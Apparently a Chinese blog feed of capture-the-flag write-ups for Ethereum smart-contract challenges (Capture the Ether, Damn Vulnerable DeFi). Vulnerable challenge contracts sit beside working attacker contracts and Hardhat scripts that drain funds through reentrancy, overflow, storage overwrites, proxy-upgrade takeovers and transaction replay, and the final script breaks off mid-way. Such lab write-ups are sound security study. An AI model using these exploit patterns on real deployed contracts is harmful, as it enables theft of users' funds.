string name)直接改自己的余额。</p><p>因为未对审查传入的token我们可以借此进行重入。</p><p>先完成溢出。</p><pre><code>//在第一个ERC20Like(token).balanceOf(msg.sender)中重入deposit(0, address(this), 0)   -&gt;  withdraw(0, address(this), 0)      -&gt;  deposit(0, address(this), 0)       -&gt;  closeLastAccount()</code></pre><p>再修改solt即可。</p><pre><code>pragma solidity 0.4.24;import "./setup.sol";import "./Bank.sol";contract Attacker {    Setup public setup;    Bank public bank;    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);    uint256 reentrancyState = 0;    constructor(Setup _setup) {        setup = _setup;        bank = _setup.bank();    }    function attack() external payable {         reentrancyState = 1;        bank.depositToken(0, address(this), 0);        writeToBalanceSlot();        uint256 wethBalance = bank.getAccountBalance(0, address(weth));        bank.withdrawToken(0, weth, 50 ether);    }    function writeToBalanceSlot() internal {        uint256 accountStructSlot = getAccountLocation(0);         uint256 wethBalanceSlot = getMapLocation(accountStructSlot + 2, uint256(address(weth)));            uint256 accountId = wethBalanceSlot - accountStructSlot;        require(accountId % 3 == 0, "mod 3 != 0, use different contract addr");        accountId = (wethBalanceSlot - accountStructSlot) / 3;        string memory toWrite = "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ";        bank.setAccountName(accountId, toWrite);    }    function getArrayLocation(        uint256 slot,        uint256 index,        uint256 elementSize    ) public pure returns (uint256) {        return            uint256(keccak256(abi.encodePacked(slot))) + (index * elementSize);    }    function getMapLocation(uint256 slot, uint256 key)        public        pure        returns (uint256)    {        return uint256(keccak256(abi.encodePacked(key, slot)));    }    function getAccountLocation(uint256 accountId)        public        view        returns (uint256)    {        uint256 slot =            uint256(                keccak256(abi.encodePacked(uint256(address(this)), uint256(2)))            );        slot = uint256(keccak256(slot));        slot += accountId * 3;        return slot;    }    function transferFrom(address from, address to, uint256 amount) external returns (bool) {        return true;    }    function transfer(address to, uint256 amount) external returns (bool) {        return true;    }    function balanceOf(address who) public returns (uint256) {        if (reentrancyState == 1) {            reentrancyState++;            bank.withdrawToken(0, this, 0);        } else if (reentrancyState == 2) {            reentrancyState++;            bank.depositToken(0, this, 0);        } else if (reentrancyState == 3) {            reentrancyState++;                   bank.closeLastAccount();        }        return 0;    }    function() external payable {    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>capture the ether(下)</title>
      <link href="/2023/03/19/capture-the-ether-%E4%B8%8B/"/>
      <url>/2023/03/19/capture-the-ether-%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="capture-the-ether-下"><a href="#capture-the-ether-下" class="headerlink" title="capture the ether(下)"></a>capture the ether(下)</h1><h2 id="Fuzzy-identity"><a href="#Fuzzy-identity" class="headerlink" title="Fuzzy identity"></a>Fuzzy identity</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;interface IName {    function name() external view returns (bytes32);}contract FuzzyIdentityChallenge {    bool public isComplete;    function authenticate() public {        require(isSmarx(msg.sender));        require(isBadCode(msg.sender));        isComplete = true;    }    function isSmarx(address addr) internal view returns (bool) {        return IName(addr).name() == bytes32("smarx");    }    function isBadCode(address _addr) internal pure returns (bool) {        bytes20 addr = bytes20(_addr);        bytes20 id = hex"000000000000000000000000000000000badc0de";        bytes20 mask = hex"000000000000000000000000000000000fffffff";        for (uint256 i = 0; i < 34; i++) {            if (addr & mask == id) {                return true;            }            mask <<= 4;            id <<= 4;        }        return false;    }}</code></pre><p>这题主要考creat2;</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;import "./text0.sol";contract attack{    function name() public returns (bytes32){        return bytes32("smarx");    }    function att(address _Fuzzy) public {        FuzzyIdentityChallenge(_Fuzzy).authenticate();    }}contract Creat2Factory{    function getBytecode() public returns (bytes memory){        bytes memory attackCode = hex"";        return attackCode;    }    function JaoBen(bytes memory attackCode,uint i,uint j) public returns(address ,uint){        bytes memory attackCodes = attackCode;        bytes20 s1 = hex"000000000000000000000000000000000badc0de";        bytes20 s2 = hex"000000000000000000000000000000000fffffff";        for(i;i<j;i++){            bytes32 hash = keccak256(abi.encodePacked(                bytes1(0xff),address(this),i, keccak256(attackCodes)            ));            for (uint256 k = 0; k < 34; k++) {            if (bytes20(uint160(uint(hash)))&s2 == s1) {                return (address(uint160(uint(hash))),i);            }         }      }    }}</code></pre><h2 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;interface ITokenReceiver {    function tokenFallback(address from, uint256 value, bytes data) external;}contract SimpleERC223Token {    // Track how many tokens are owned by each address.    mapping (address => uint256) public balanceOf;    string public name = "Simple ERC223 Token";    string public symbol = "SET";    uint8 public decimals = 18;    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);    event Transfer(address indexed from, address indexed to, uint256 value);    function SimpleERC223Token() public {        balanceOf[msg.sender] = totalSupply;        emit Transfer(address(0), msg.sender, totalSupply);    }    function isContract(address _addr) private view returns (bool is_contract) {        uint length;        assembly {            //retrieve the size of the code on target address, this needs assembly            length := extcodesize(_addr)        }        return length > 0;    }     function transfer(address to, uint256 value) public returns (bool success) {        bytes memory empty;        return transfer(to, value, empty);    }    function transfer(address to, uint256 value, bytes data) public returns (bool) {        require(balanceOf[msg.sender] >= value);        balanceOf[msg.sender] -= value;        balanceOf[to] += value;        emit Transfer(msg.sender, to, value);        if (isContract(to)) {            ITokenReceiver(to).tokenFallback(msg.sender, value, data);        }        return true;    }    event Approval(address indexed owner, address indexed spender, uint256 value);    mapping(address => mapping(address => uint256)) public allowance;    function approve(address spender, uint256 value)        public        returns (bool success)    {        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);        return true;    }    function transferFrom(address from, address to, uint256 value)        public        returns (bool success)    {        require(value <= balanceOf[from]);        require(value <= allowance[from][msg.sender]);        balanceOf[from] -= value;        balanceOf[to] += value;        allowance[from][msg.sender] -= value;        emit Transfer(from, to, value);        return true;    }}contract TokenBankChallenge {    SimpleERC223Token public token;    mapping(address => uint256) public balanceOf;    function TokenBankChallenge(address player) public {        token = new SimpleERC223Token();        // Divide up the 1,000,000 tokens, which are all initially assigned to        // the token contract's creator (this contract).        balanceOf[msg.sender] = 500000 * 10**18;  // half for me        balanceOf[player] = 500000 * 10**18;      // half for you    }    function isComplete() public view returns (bool) {        return token.balanceOf(this) == 0;    }    function tokenFallback(address from, uint256 value, bytes) public {        require(msg.sender == address(token));        require(balanceOf[from] + value >= balanceOf[from]);        balanceOf[from] += value;    }    function withdraw(uint256 amount) public {        require(balanceOf[msg.sender] >= amount);        require(token.transfer(msg.sender, amount));        balanceOf[msg.sender] -= amount;    }}</code></pre><p>withdraw函数有很明显的漏洞，它是先转后减的，我们可以借机重入。</p><pre class=" language-1"><code class="language-1">contract pwn{    SimpleERC223Token public token;    TokenBankChallenge public target;    uint8 public reentrytimes = 0;    bool  public startrenentry = false;    function pwn(){        token = SimpleERC223Token();        target = TokenBankChallenge();    }    function init(){        token.transfer(address(target),500000000000000000000000);    }    function start(){                target.withdraw(500000000000000000000000);    }    function tokenFallback(address from, uint256 value, bytes) public{    require(msg.sender == address(token));    if ( startrenentry && reentrytimes < 1){        reentrytimes += 1;        target.withdraw(500000000000000000000000);            }    if (startrenentry == false){        startrenentry = true;    }    }    function() payable{    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>capture the ether(上)</title>
      <link href="/2023/03/19/capture-the-ether-%E4%B8%8A/"/>
      <url>/2023/03/19/capture-the-ether-%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="capture-the-ether-上"><a href="#capture-the-ether-上" class="headerlink" title="capture the ether(上)"></a>capture the ether(上)</h1><h2 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;contract GuessTheNewNumberChallenge {    function GuessTheNewNumberChallenge() public payable {        require(msg.value == 0.001 ether);    }    function isComplete() public view returns (bool) {        return address(this).balance == 0;    }    function guess(uint8 n) public payable {        require(msg.value == 0.001 ether);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));        if (n == answer) {            msg.sender.transfer(0.002 ether);        }    }}</code></pre><p>很明显的伪随机数。因为合约之间的调用是在同一个区块当中的，也就是说，如果我们通过攻击合约进行调用guess，那么我们攻击合约生成的answer与guess生成的answer是相同的。</p><pre><code>contract attack{    Guess guesst;    function attack(address _addr)public{        guesst = Guess(_addr);    }    function attacks()public payable{        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));        guesst.guess.value(0.001 ether)(answer);    }    function()external payable{                                           }}</code></pre><h2 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;contract PredictTheFutureChallenge {    address guesser;    uint8 guess;    uint256 settlementBlockNumber;    function PredictTheFutureChallenge() public payable {        require(msg.value == 1 ether);    }    function isComplete() public view returns (bool) {        return address(this).balance == 0;    }    function lockInGuess(uint8 n) public payable {        require(guesser == 0);        require(msg.value == 1 ether);        guesser = msg.sender;        guess = n;        settlementBlockNumber = block.number + 1;    }    function settle() public {        require(msg.sender == guesser);        require(block.number > settlementBlockNumber);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;        guesser = 0;        if (guess == answer) {            msg.sender.transfer(2 ether);        }    }}</code></pre><p>又是预测数很明显answer只在0~9之间。爆破即可。</p><pre class=" language-1"><code class="language-1">contract attack{    Predict guess;   function attack(address _addr)payable{       guess=Predict(_addr);       geuss.lockInGuess.value(1 ether)(5);    }    function attacks(address _addr)public payable{            uint8 n =5;       uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;        if (n==answer){            guess.settle();                }else{            return;        }           }    function()external payable{    }}</code></pre><h2 id="Pridict-the-block-hash"><a href="#Pridict-the-block-hash" class="headerlink" title="Pridict the block hash"></a>Pridict the block hash</h2><pre class=" language-1"><code class="language-1">contract PredictTheBlockHashChallenge {    address guesser;    bytes32 guess;    uint256 settlementBlockNumber;    function PredictTheBlockHashChallenge() public payable {        require(msg.value == 0.001 ether);    }    function isComplete() public view returns (bool) {        return address(this).balance == 0;    }    function lockInGuess(bytes32 hash) public payable {        require(guesser == 0);        require(msg.value == 0.001 ether);        guesser = msg.sender;        guess = hash;        settlementBlockNumber = block.number + 1;    }    function settle() public {        require(msg.sender == guesser);        require(block.number > settlementBlockNumber);        bytes32 answer = block.blockhash(settlementBlockNumber);        guesser = 0;        if (guess == answer) {            msg.sender.transfer(0.002 ether);        }    }}</code></pre><p>这个题需要我们提前知道后一个区块的区块哈希。block.blockhash只能得到256个区块内的哈希值，一旦超过256的区块，就会返回0。</p><pre class=" language-1"><code class="language-1">contract attack{    Predict guess;    uint256 public blocknumber;    bytes32 answer;    function attack(address _addr)public{        guess = Predict(_addr);    }    function lock()public payable{        blocknumber = block.number+1;        guess.lockInGuess.value(0.001 ether)(answer);    }    function attacks()public{        require(block.number-256>blocknumber);        guess.settle();    }    function ()external payable{    }}</code></pre><h2 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;contract TokenWhaleChallenge {    address player;    uint256 public totalSupply;    mapping(address => uint256) public balanceOf;    mapping(address => mapping(address => uint256)) public allowance;    string public name = "Simple ERC20 Token";    string public symbol = "SET";    uint8 public decimals = 18;    function TokenWhaleChallenge(address _player) public {        player = _player;        totalSupply = 1000;        balanceOf[player] = 1000;    }    function isComplete() public view returns (bool) {        return balanceOf[player] >= 1000000;    }    event Transfer(address indexed from, address indexed to, uint256 value);    function _transfer(address to, uint256 value) internal {        balanceOf[msg.sender] -= value;        balanceOf[to] += value;        emit Transfer(msg.sender, to, value);    }    function transfer(address to, uint256 value) public {        require(balanceOf[msg.sender] >= value);        require(balanceOf[to] + value >= balanceOf[to]);        _transfer(to, value);    }    event Approval(address indexed owner, address indexed spender, uint256 value);    function approve(address spender, uint256 value) public {        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);    }    function transferFrom(address from, address to, uint256 value) public {        require(balanceOf[from] >= value);        require(balanceOf[to] + value >= balanceOf[to]);        require(allowance[from][msg.sender] >= value);        allowance[from][msg.sender] -= value;        _transfer(to, value);    }}</code></pre><p>这题有逻辑漏洞和下溢。transferFrom前面一系列检查都是检查的from，然而转账的时候却是转的msg.sender。且balanceOf[msg.sender] -= value存在下溢。</p><h2 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;contract RetirementFundChallenge {    uint256 startBalance;    address owner = msg.sender;    address beneficiary;    uint256 expiration = now + 10 years;    function RetirementFundChallenge(address player) public payable {        require(msg.value == 1 ether);        beneficiary = player;        startBalance = msg.value;    }    function isComplete() public view returns (bool) {        return address(this).balance == 0;    }    function withdraw() public {        require(msg.sender == owner);        if (now < expiration) {            // early withdrawal incurs a 10% penalty            msg.sender.transfer(address(this).balance * 9 / 10);        } else {            msg.sender.transfer(address(this).balance);        }    }    function collectPenalty() public {        require(msg.sender == beneficiary);        uint256 withdrawn = startBalance - address(this).balance;        // an early withdrawal occurred        require(withdrawn > 0);        // penalty is what's left        msg.sender.transfer(address(this).balance);    }}</code></pre><p>想要转走钱withdraw函数显然行不通。那只能是collectPenalty函数。只要让uint256 withdrawn = startBalance - address(this).balance下溢即可。<br>通过自毁合约强行转入1eth即可。</p><pre class=" language-1"><code class="language-1">contract attack{    function attacks(address _addr)public payable{        selfdestruct(_addr);    }}</code></pre><h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;contract MappingChallenge {    bool public isComplete;    uint256[] map;    function set(uint256 key, uint256 value) public {        // Expand dynamic array as needed        if (map.length <= key) {            map.length = key + 1;        }        map[key] = value;    }    function get(uint256 key) public view returns (uint256) {        return map[key];    }}</code></pre><p>这题就是考对可变数组的储存的理解。</p><p>slot[0]存iscomplete,slot[1]存储数组的长度，数组的data存储在：keccak256(bytes(1))+x，x就是数组的下标。</p><p>计算数组data起始位：</p><pre class=" language-1"><code class="language-1">contract attack{    uint256 public i;    function attacks()public {      i =2**256-uint256(keccak256(bytes32(1)));    }}</code></pre><p>i就是我们算出来的slot[0]的位置。</p><h2 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;contract DonationChallenge {    struct Donation {        uint256 timestamp;        uint256 etherAmount;    }    Donation[] public donations;    address public owner;    function DonationChallenge() public payable {        require(msg.value == 1 ether);                owner = msg.sender;    }        function isComplete() public view returns (bool) {        return address(this).balance == 0;    }    function donate(uint256 etherAmount) public payable {        // amount is in ether, but msg.value is in wei        uint256 scale = 10**18 * 1 ether;        require(msg.value == etherAmount / scale);        Donation donation;        donation.timestamp = now;        donation.etherAmount = etherAmount;        donations.push(donation);    }    function withdraw() public {        require(msg.sender == owner);                msg.sender.transfer(address(this).balance);    }}</code></pre><p>注意到donate函数里面结构体的声明并没有初始化，也没有说明存储在那里，所以默认是在storage上，所以slot[0]是Donation[ ]，slot[1]是owner。又因为结构体在函数内非显式地初始化的时候会使用storage存储而不是memory，所以就可以达到变量覆盖的效果。我们用etherAmoun覆盖owner就行了。</p><h2 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h2><p>```1<br>pragma solidity ^0.4.21;</p><p>contract FiftyYearsChallenge {<br>    struct Contribution {<br>        uint256 amount;<br>        uint256 unlockTimestamp;<br>    }<br>    Contribution[] queue;<br>    uint256 head;</p><pre><code>address owner;function FiftyYearsChallenge(address player) public payable {    require(msg.value == 1 ether);    owner = player;    queue.push(Contribution(msg.value, now + 50 years));}function isComplete() public view returns (bool) {    return address(this).balance == 0;}function upsert(uint256 index, uint256 timestamp) public payable {    require(msg.sender == owner);    if (index &gt;= head &amp;&amp; index &lt; queue.length) {        // Update existing contribution amount without updating timestamp.        Contribution storage contribution = queue[index];        contribution.amount += msg.value;    } else {        // Append a new contribution. Require that each contribution unlock        // at least 1 day after the previous one.        require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);        contribution.amount = msg.value;        contribution.unlockTimestamp = timestamp;        queue.push(contribution);    }}function withdraw(uint256 index) public {    require(msg.sender == owner);    require(now &gt;= queue[index].unlockTimestamp);    // Withdraw this and any earlier contributions.    uint256 total = 0;    for (uint256 i = head; i &lt;= index; i++) {        total += queue[i].amount;        // Reclaim storage.        delete queue[i];    }    // Move the head of the queue forward so we don't have to loop over    // already-withdrawn contributions.    head = index + 1;    msg.sender.transfer(total);}</code></pre><p>}<br>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days)很明显存在一个溢出的问题，只要数组最后一个元素的unlockTimestamp够大，就会出现溢出。</p><p>在upsert函数,当index小于数组长度时，就会覆盖原来的Contribution。 当index大于等于数组长度时，就会有新的Contribution，amount会覆盖queue的length，unlockTimestamp会覆盖head。</p><p>方法：<br>1：传入index（大于1）,timestamp为溢出值。<br>2：传入index（大于2）,timestamp为0。<br>3；调用withdraw函数。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Damn-Defi-题解（下）</title>
      <link href="/2023/03/09/Damn-Defi-%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
      <url>/2023/03/09/Damn-Defi-%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi-题解-下"><a href="#Damn-Defi-题解-下" class="headerlink" title="Damn Defi 题解(下)"></a>Damn Defi 题解(下)</h1><h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><p>有一个Gnosis Safe的钱包注册表，注册表中有四十个DVT代币，我们要从注册表中取出所有资金。</p><p>写这题需要对GnosisSafeWallet的源码足够了解。</p><p>这题有2个主要函数。</p><p>addBeneficiary(): 添加受益人到注册表的函数,beneficiaries[]就是检测是否为注册表里有的地址。</p><p>proxyCreated(): 注册钱包的函数，注册完成，并且合约会给注册者发送十个dvt代币。</p><p>通过注释我们可以知道创建钱包时会执行函数createProxyWithCallback，再回调proxyCreated。因此我们把目光看向createProxyWithCallback函数</p><p>入参有四个：</p><p>1：address _singleton<br>这是一个单例地址</p><p>2：bytes memory initializer<br>这是初始化器的字节码，初始化函数其实就是GnosisSafe里的setup()函数</p><p>3：uint256 saltNonce<br>这是Create2里的随机数，我们不用关心</p><p>4：IProxyCreationCallback callback<br>这是回调合约的地址</p><p>注意到调用了createProxyWithNonce函数，这个函数内主要其实就是对initializer初始化函数的调用，只不过是用汇编实现的。</p><p>我们看到setup()函数,一眼就看到了setupModules(to, data);这明显是一个外部调用。到这其实思路有了。我们可以借此让钱包approve给我们所有的token，我们只需要把这个token转出来即可。</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;import  "@openzeppelin/contracts/token/ERC20/IERC20.sol";import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";contract attack{   GnosisSafeProxyFactory public factory;   IProxyCreationCallback public callback;   address[] public users;   address public singleton;   address token;   constructor (address _factory,address _callback,address[] memory _users,address _singleton,address _token)public {    factory=GnosisSafeProxyFactory(_factory);    callback=IProxyCreationCallback(_callback);    users=_users;    singleton=_singleton;    token=_token;           }    function approve(address _token,address spender)public{        IERC20(_token).approve(spender,10 ether);    }    function attack()public {        bytes memory data=abi.encodeWithSignature("approve(address,address)",token,address(this));        for(uint256 i=0;i<users.length;i++){            address[] memory owners=new address[](1);            owners[0]=users[i];           bytes memory initializer=abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",                                    owners,                                    1,                                    address(this),                                    data,                                   address(0),                                   address(0),                                     0,                                   address(0)           );           GnosisSafeProxy proxy=factory.createProxyWithCallback(singleton,initializer,0,callback);           IERC20(token).transferFrom(address(proxy),tx.origin,10 ether);        }           }}</code></pre><h2 id="Climber"><a href="#Climber" class="headerlink" title="Climber"></a>Climber</h2><p>题目要求取走我们金库合约中所有代币。</p><p>此题用了UUPS代理模式，建议写题前先了解代理\现实合约。</p><p>ClimberVault：<br>很明显要取走所有代币要调用sweepFunds函数，但是有onlySweeper的限制。<br>因此我们可以通过合约升级，直接修改sweepFunds函数。</p><p>ClimberTimelock：</p><p>schedule()函数给要执行的操作给权限。</p><p>execute()为执行提供的操作。</p><p>到此思路已经很明显了。<br>1：授予攻击合约PROPOSER_ROLE<br>2：让delay变为0<br>3：升级climbervalut合约覆盖掉sweepfunds方法<br>4：将代币都发送到attacker的账户中。</p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";import "./ClimberTimelock.sol";import "@openzeppelin/contracts/token/ERC20/IERC20.sol";import "./ClimberVault.sol";contract attack is UUPSUpgradeable{        ClimberTimelock timelock;         address vaultProxyAddress;         IERC20 token;         address  attacker;               constructor(ClimberTimelock _timelock,IERC20 _token,address _vaultProxyAddress)         {             attacker==msg.sender;             timelock=_timelock;             token=_token;             vaultProxyAddress=_vaultProxyAddress;         }               function creation() internal returns(address[]memory,uint256[]memory,bytes[]memory){              address[] memory target = new address[](5);              uint256[] memory value = new uint256[](5);              bytes[] memory data = new bytes[](5);              target[0] = address(timelock);              value[0] = 0;              data[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector,0);              target[1] = address(timelock);              value[1] = 0;              data[1] = abi.encodeWithSelector(AccessControl.grantRole.selector,timelock.PROPOSER_ROLE(),address(this));              target[2] = address(this);              value[2] = 0;              data[2] = abi.encodeWithSelector(attack.Apply.selector);              target[3] = address(vaultProxyAddress);              value[3] = 0;              data[3] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector,address(this));              target[4] = address(vaultProxyAddress);              value[4] = 0;              data[4] = abi.encodeWithSelector(attack.sweepFunds.selector);              return (target,value,data);         }             function Apply() external{             (                 address[] memory target,                 uint256[] memory value,                 bytes[] memory data             ) = creation();             timelock.schedule(target, value, data, 0);         }        function play() external{             (                 address[] memory target,                 uint256[] memory value,                 bytes[] memory data             ) = creation();             timelock.execute(target, value, data, 0);         }         function sweepFunds() external {             token.transfer(attacker,token.balanceOf(address(this)));         }                         function _authorizeUpgrade(address newIm) internal override {}}</code></pre><h2 id="Wallet-Mining"><a href="#Wallet-Mining" class="headerlink" title="Wallet Mining"></a>Wallet Mining</h2><p>题目要我们取走一个空地址中的token。</p><p>首先发现要求我们要能够部署factory、mastercopy合约，且还要在同一个地址。但player很明显也不是链上创建者的地址。</p><p>其实这题的关键是重放攻击。</p><p>我们先从etherscan上找到raw data（more -&gt; get Raw transaction Hash），随后在test/wallet-mining/wallet-mining.challenge.js中进行攻击。<br>此时，尽管是player假冒，但扣的依旧是victim的ETH。</p><pre><code>pragma solidity ^0.8.0;import "hardhat/console.sol";contract AttackWalletMining {  function test() public {    selfdestruct(payable(address(0)));  }  function proxiableUUID() external view returns (bytes32) {    return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;  }  // Explanation of GAS code  // TODO(0xth3g450pt1m1z0r) put some comments    function can(address u, address a) public view returns (bool) {        assembly {             // AUthorizer Upgrader proxy address (mom)            let m := sload(0)            // Ensure m has code            if iszero(extcodesize(m)) {return(0, 0)}            // load free memory address at 0x40 into p            let p := mload(0x40)            // store [p + 0x44] at 0x40 to update free memory pointer            mstore(0x40,add(p,0x44))            // store at p the sighash for the can() function in AuthorizeUpgrader            mstore(p,shl(0xe0,0x4538c4eb))            // store at p + 0x04 the imp address            mstore(add(p,0x04),u)            // store at p + 0x24 the aim address            mstore(add(p,0x24),a)            // Static call the function and check return is &gt; 0            if iszero(staticcall(gas(),m,p,0x44,p,0x20)) {return(0,0)}            // Check return data size is NOT zero AND return data is 0 then return false 0            if and(not(iszero(returndatasize())), iszero(mload(p))) {return(0,0)}        }        return true;    }}</code></pre><pre><code>          const printPlayerTokenBalance = async () =&gt; {            let bal = await token.balanceOf(player.address);            log("Player balance = ", ethers.utils.formatEther(bal))        }        const data = require("./data.json");        log("Player address is", player.address)                const attackWalletDeployer = walletDeployer.connect(player);        const attackAuthorizer = authorizer.connect(player);        const tx = {            to: data.REPLAY_DEPLOY_ADDRESS,            value: ethers.utils.parseEther("1")        }        await player.sendTransaction(tx);        const deploySafeTx = await (await ethers.provider.sendTransaction(data.DEPLOY_SAFE_TX)).wait();        const safeContractAddr = deploySafeTx.contractAddress;        log("Replayed deploy Master Safe Copy at", safeContractAddr);        const randomTx = await (await ethers.provider.sendTransaction(data.RANDOM_TX)).wait();        const deployFactoryTx = await (await ethers.provider.sendTransaction(data.DEPLOY_FACTORY_TX)).wait();        const factoryContractAddr = deployFactoryTx.contractAddress;        log("Replayed deploy safe factory at", factoryContractAddr);        const proxyFactory = await ethers.getContractAt("GnosisSafeProxyFactory", factoryContractAddr, player);        const createInterface = (signature, methodName, arguments) =&gt; {            const ABI = signature;            const IFace = new ethers.utils.Interface(ABI);            const ABIData = IFace.encodeFunctionData(methodName, arguments);            return ABIData;        }        const safeABI = ["function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)",                        "function execTransaction( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes calldata signatures)",                        "function getTransactionHash( address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce)"];        const setupDummyABIData = createInterface(safeABI, "setup",  [            [player.address],            1,            ethers.constants.AddressZero,            0,            ethers.constants.AddressZero,            ethers.constants.AddressZero,            0,            ethers.constants.AddressZero,        ])        let nonceRequired = 0        let address = ""        while (address.toLowerCase() != DEPOSIT_ADDRESS.toLowerCase()) {            address = ethers.utils.getContractAddress({                from: factoryContractAddr,                nonce: nonceRequired            });            nonceRequired += 1;        }        log(`Need to deploy ${nonceRequired} proxies to get access to 20mil`);        for (let i = 0; i &lt; nonceRequired ; i ++) {            await proxyFactory.createProxy(safeContractAddr, setupDummyABIData);        }           const tokenABI = ["function transfer(address to, uint256 amount)"];        const tokenABIData = createInterface(tokenABI, "transfer", [player.address, DEPOSIT_TOKEN_AMOUNT]);        const depositAddrSafe = await ethers.getContractAt("GnosisSafe", DEPOSIT_ADDRESS, player);        log("Version:", await depositAddrSafe.VERSION());                const transactionParams = [            token.address,            0,            tokenABIData,            0,            0,            0,            0,            ethers.constants.AddressZero,            ethers.constants.AddressZero,            0        ];        const txhash = await depositAddrSafe.getTransactionHash(...transactionParams);        const signed = await player.signMessage(ethers.utils.arrayify(txhash));        const signedIncreaseV = ethers.BigNumber.from(signed).add(4).toHexString();        log("Executing signed tx to transfer all tokens to player address");        await depositAddrSafe.execTransaction(...(transactionParams.slice(0, -1)), signedIncreaseV);        await printPlayerTokenBalance()            const impSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";        let implementationAddress = "0x" + (await ethers.provider.getStorageAt(attackAuthorizer.address, impSlot)).slice(-40);        const impContract = await ethers.getContractAt("AuthorizerUpgradeable", implementationAddress, player);        log("Deploying attacking contract");        const attackContractFactory = await ethers.getContractFactory("AttackWalletMining", player);        const attackContract = await attackContractFactory.deploy();        const attackABI = ["function test()"];        const IAttack = createInterface(attackABI, "test", []);        log("Claiming ownership of implementation contract and upgrading to attacking contract");        await impContract.init([], []);        await impContract.upgradeToAndCall(attackContract.address, IAttack);        log("Deploying 43 proxies through Deployer and collecting tokens")        for (let i = 0; i &lt; 43; i ++) {            await (await attackWalletDeployer.drop(setupDummyABIData)).wait();        }        await printPlayerTokenBalance()</code></pre><p>这题我也不太懂，题解是抄一大佬的。</p><h2 id="Puppet-v3"><a href="#Puppet-v3" class="headerlink" title="Puppet v3"></a>Puppet v3</h2><p>Uniswap V3 采用TWAP(加权平均算法)。即随着时间比重算出加权后的价格。所以很明显，在同一笔交易内是不可能完成的了。</p><p>TWAP并不能防止“砸盘”，之所以能有效防止价格操纵，是因为随着时间的增加，进入了多人博弈。但在题中只有player。</p><pre><code>  /** CODE YOUR SOLUTION HERE */        const log = console.log;        const attackPool = await uniswapPool.connect(player);        const attackLendingPool = await lendingPool.connect(player);        const attackToken = await token.connect(player);        const attackWeth = await weth.connect(player);        const logBalances = async (name, address) =&gt; {            const dvt_bal = await attackToken.balanceOf(address);            const weth_bal = await weth.balanceOf(address);            const eth_bal = await ethers.provider.getBalance(address);            log(`Logging balance of ${name}`);            log('DVT:', ethers.utils.formatEther(dvt_bal))            log('WETH:', ethers.utils.formatEther(weth_bal))            log('ETH:', ethers.utils.formatEther(eth_bal))            log('')        };        await logBalances("Player", player.address)        const getQuote = async(amount, print=true) =&gt; {            const quote = await attackLendingPool.calculateDepositOfWETHRequired(amount);            if (print) log(`Quote of ${ethers.utils.formatEther(amount)} DVT is ${ethers.utils.formatEther(quote)} WETH`)            